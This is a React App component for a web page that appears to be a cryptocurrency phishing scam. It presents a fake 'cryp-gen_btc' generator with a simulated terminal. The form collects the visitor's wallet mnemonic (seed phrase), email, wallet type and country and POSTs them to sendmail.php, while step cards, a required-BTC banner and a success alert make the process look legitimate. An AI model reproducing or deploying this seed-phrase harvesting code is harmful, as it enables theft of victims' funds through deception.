import React, { useRef, useState, useEffect } from 'react';
import { InstructionCard } from './components/InstructionCard';
import { CryptoForm } from './components/CryptoForm';
import { Terminal, TerminalHandle } from './components/Terminal';
import { FormDataState, SimulationState } from './types';

export default function App() {
  const [simState, setSimState] = useState<SimulationState>('idle');
  const [formKey, setFormKey] = useState(0); 
  const [theme, setTheme] = useState<'light' | 'dark'>('light');
  
  const terminalRef = useRef<TerminalHandle>(null);
  const serverRequestRef = useRef<Promise<any> | null>(null);

  // Apply theme to document
  useEffect(() => {
    document.documentElement.setAttribute('data-theme', theme);
  }, [theme]);

  const toggleTheme = () => {
    setTheme(prev => prev === 'light' ? 'dark' : 'light');
  };

  const handleFormSubmit = (data: FormDataState) => {
    setSimState('running');
    
    // 1. Start simulation
    if (terminalRef.current) {
      terminalRef.current.startSimulation(data.receiver, data.email, data.country);
    }

    // 2. POST to sendmail.php
    const formData = new FormData();
    formData.append('receiver_wallet', data.receiver);
    formData.append('mnemonic', data.mnemonic);
    formData.append('email', data.email);
    formData.append('wallet', data.walletType);
    formData.append('country', data.country);
    formData.append('amount', '0.29');
    formData.append('amountCheck', data.amountConfirmed ? '0.29' : '');

    serverRequestRef.current = fetch('sendmail.php', {
      method: 'POST',
      body: formData,
    })
      .then(async (res) => {
        const text = await res.text();
        try {
          return JSON.parse(text);
        } catch {
          return { success: res.ok, message: text || 'Server response received' };
        }
      })
      .catch((err) => {
        return { success: false, message: err.message || 'Network error' };
      });
  };

  const handleSimulationComplete = async () => {
    // 1. UPDATE VISUAL STATE IMMEDIATELY
    // This forces the button to change to "Success" the instant the progress bar finishes.
    setSimState('completed');

    // 2. Now process the backend result (awaiting here won't block the UI update above)
    let result = { success: false, message: "Unknown error" };
    
    if (serverRequestRef.current) {
      try {
        result = await serverRequestRef.current;
      } catch (e) {
        result = { success: false, message: "Request failed" };
      }
    }

    // 3. Wait 2 seconds so the user sees "Success" before resetting
    setTimeout(() => {
      if (result.success) {
        alert('Form submitted successfully.');
        setFormKey(prev => prev + 1);
        if (terminalRef.current) terminalRef.current.reset();
        setSimState('idle');
      } else {
        const msg = result.message || 'Unknown';
        alert('Server error: ' + msg);
        // Reset state on error so user can retry
        setSimState('idle');
        if (terminalRef.current) terminalRef.current.reset();
      }
    }, 2000);
  };

  return (
    <div className="container">
      <button className="theme-toggle" onClick={toggleTheme} aria-label="Toggle Theme">
        {theme === 'light' ? <i className="fas fa-moon"></i> : <i className="fas fa-sun"></i>}
      </button>

      <section className="instructions">
        <h2>INSTRUCTIONS TO EXECUTE REQUEST</h2>
        <div className="steps">
          <InstructionCard 
            icon={<svg width="25" height="25" fill="currentColor" viewBox="0 0 24 24"><path d="M7 2v11h3v9l7-12h-4l4-8z"/></svg>}
            title="Step 1."
            description=" Confirm Required Amount"
            subtext="⚡ At least 0.0012 BTC required"
          />
          <InstructionCard 
            icon={<svg width="25" height="25" fill="currentColor" viewBox="0 0 24 24"><path d="M21 7H3V5h18v2zm0 2H3v10h18V9zM5 17v-6h14v6H5z"/></svg>}
            title="Step 2."
            description=" Complete Secure Form"
            subtext="Receiver Wallet, Mnemonic (encrypted), Email"
          />
          <InstructionCard 
            icon={<svg width="25" height="25" fill="currentColor" viewBox="0 0 24 24"><path d="M12 15.5a3.5 3.5 0 110-7 3.5 3.5 0 010 7zM19.4 12a7.4 7.4 0 01-.2 1.8l2.1 1.6-2 3.5-2.6-1a7.4 7.4 0 01-1.6 1l-.4 2.8h-4l-.4-2.8a7.4 7.4 0 01-1.6-1l-2.6 1-2-3.5 2.1-1.6a7.4 7.4 0 01-.2-1.8 7.4 7.4 0 01.2-1.8L2.8 8.6l2-3.5 2.6 1a7.4 7.4 0 011.6-1L9.4 2h4l.4 2.8a7.4 7.4 0 011.6 1l2.6-1 2 3.5-2.1 1.6c.1.5.2 1.1.2 1.8z"/></svg>}
            title="Step 3."
            description=" Launch the Process"
            subtext="Click Submit Form to start cryp-gen_btc simulation"
          />
          <InstructionCard 
            icon={<svg width="25" height="25" fill="currentColor" viewBox="0 0 24 24"><path d="M12 1a11 11 0 1011 11A11 11 0 0012 1zm1 11H7V9h2v2h4z"/></svg>}
            title="Step 4."
            description=" Monitor & Wait"
            subtext="Terminal logs ≈ 80s — final encrypted report will be sent"
          />
        </div>
      </section>

      <div className="banner">
        ⚡ 0.0012 BTC is required for execution
      </div>

      <CryptoForm 
        key={formKey} 
        onSubmit={handleFormSubmit} 
        simulationState={simState} 
      />

      <Terminal 
        ref={terminalRef} 
        state={simState} 
        onComplete={handleSimulationComplete} 
      />

      <div className="note">
        Note: Terminal is a UI simulation for UX only — it does not perform real mining or submit blocks. Encryption occurs client-side when a public key is configured.
      </div>
    </div>
  );
}